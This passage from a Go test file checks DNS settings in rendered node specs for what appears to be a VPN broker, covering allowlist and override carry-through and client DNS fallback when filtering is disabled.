	if !contains(spec.DNS.Allowlist, "*.example.com") {
		t.Errorf("operator allowlist not carried: %v", spec.DNS.Allowlist)
	}
	if spec.DNS.Custom.Overrides["conditional"] == nil {
		t.Errorf("operator conditional override not carried: %v", spec.DNS.Custom.Overrides)
	}
	// Clients are handed the master gateway (.1 in the client pool) as their DNS.
	if cd := spec.Master.Compose.ClientDNS; len(cd) != 1 || cd[0] != "10.80.0.1" {
		t.Errorf("client DNS should be the master gateway 10.80.0.1, got %v", cd)
	}
}

func TestRenderMasterDNSDisabledByDefault(t *testing.T) {
	// Without dns_filter the master runs no resolver and clients still point at the
	// exit blockys (pre-ADR-0024 behavior).
	ctx := context.Background()
	b, st := newBroker(t)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if spec.DNS.Enabled {
		t.Error("master DNS should be disabled without dns_filter")
	}
	if !contains(spec.Master.Compose.ClientDNS, "10.20.0.5") {
		t.Errorf("clients should fall back to the exit blocky mgmt addr, got %v", spec.Master.Compose.ClientDNS)
	}
}
